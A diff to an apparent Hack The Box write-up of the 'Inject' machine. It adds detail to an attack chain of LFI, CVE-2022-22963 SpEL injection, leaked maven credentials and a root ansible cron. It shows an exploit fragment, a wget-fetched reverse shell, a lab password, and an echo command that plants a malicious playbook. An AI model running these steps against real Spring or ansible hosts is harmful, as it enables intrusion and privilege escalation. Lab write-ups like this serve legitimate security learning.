@@ -5,6 +5,7 @@ subtitle: "LFI leaks the pom, Spring Cloud Function SpEL injection gives a shell
 date: 2023-04-03
 tags: [htb, linux, spring, cve-2022-22963, ansible]
 category: writeups
+kind: machine
 tldr: "A path traversal in an image endpoint leaked the app source and pom.xml, which pinned spring-cloud-function-web 3.2.2. That version is vulnerable to CVE-2022-22963, a SpEL injection in the routing expression header, which gave a shell as the app user. A maven settings.xml leaked phil's password for lateral movement, and a root-run ansible-playbook over a writable tasks directory gave root."
 ---
 
@@ -47,11 +48,11 @@ def execCommand(command):
                          data="a", headers=headers)
 ```
 
-The script stages a reverse shell script, fetches it onto the box with `wget` to `/tmp/.shell.sh`, then runs it with `bash`. That gave me a shell as the app user.
+The script stages a reverse shell script, fetches it onto the box with `wget` to `/tmp/.shell.sh`, then runs it with `bash`. That gave me a shell as `frank`, the app user.
 
 ## user
 
-On disk I found a maven settings file holding phil's credentials in cleartext:
+On disk I found `/home/frank/.m2/settings.xml`, a maven settings file holding phil's credentials in cleartext:
 
 ```xml
 <server>
@@ -61,7 +62,7 @@ On disk I found a maven settings file holding phil's credentials in cleartext:
 </server>
 ```
 
-`su phil` with `DocPhillovestoInject123` worked, and phil owned the user flag.
+`sshd_config` had `DenyUsers phil`, so SSH was out, but `su phil` with `DocPhillovestoInject123` worked from frank's shell, and phil owned the user flag.
 
 ## root
 
@@ -71,7 +72,7 @@ Process monitoring with pspy showed root running ansible on a schedule:
 UID=0 PID=1485 | /usr/bin/python3 /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml
 ```
 
-Root executes every playbook it finds in `/opt/automation/tasks/`, and that directory was writable. So I dropped a second playbook that runs a shell task:
+The cron is `ansible-parallel /opt/automation/tasks/*.yml`, so root runs every playbook it finds in `/opt/automation/tasks/`. That directory was group-writable by `staff`, and phil is in `staff`, so I could drop my own playbook. I added one that runs a shell task:
 
 ```bash
 echo "[{hosts: localhost, tasks: [shell: /bin/bash /tmp/.shell.sh]}]" > /opt/automation/tasks/playbook_2.yml
@@ -81,4 +82,8 @@ When the cron picked it up, ansible ran my task as root, and that got me the roo
 
 ## takeaway
 
-The chain is one mistake feeding the next. The LFI did not directly give code execution, but it leaked the exact dependency versions, which turned a guess into a known CVE. Pinning a vulnerable spring-cloud-function release is the real foothold. For root, a root process that blindly runs every file in a world-writable directory is a privilege escalation waiting for anyone with a shell.
+The chain is one mistake feeding the next. The LFI did not directly give code execution, but it leaked the exact dependency versions, which turned a guess into a known CVE. Pinning a vulnerable spring-cloud-function release is the real foothold. For root, a root process that blindly runs every file in a group-writable directory is a privilege escalation waiting for anyone in that group.
+
+## references
+
+- [0xdf - HTB: Inject](https://0xdf.gitlab.io/2023/07/08/htb-inject.html)
